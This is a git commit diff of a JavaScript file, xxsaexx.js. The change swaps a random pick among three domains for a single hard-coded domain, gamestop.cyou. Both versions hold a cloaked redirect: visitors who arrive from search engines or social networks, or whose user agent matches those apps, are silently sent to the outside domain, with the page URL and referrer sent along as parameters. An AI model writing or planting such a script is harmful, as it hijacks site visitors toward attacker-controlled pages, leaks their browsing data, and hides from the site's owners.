454c12833c02d00b3c7526c61324adc94267c458
adelvina <103128927+adelvina@users.noreply.github.com>
2023-01-06 10:57:51 +0700

    Update xxsaexx.js

--- xxsaexx.js
+++ xxsaexx.js
@@ -1,12 +1,3 @@
-var ars 	= rChoice([
-	'https://golek.icu/',
-	'https://wohnkultur.pw/',
-	'https://insurancedefinition.xyz/'
-	]);
+var ars = 'http://gamestop.cyou/';
 
-function rChoice(arr) {
-    return arr[Math.floor(arr.length * Math.random())];
-}
-
-//Code arsae client javascript
-if(['.google.', 'bing.', '.yahoo.',  'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', '.yahoo.', 'duckduckgo.', 'instagram.', 'twitter.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
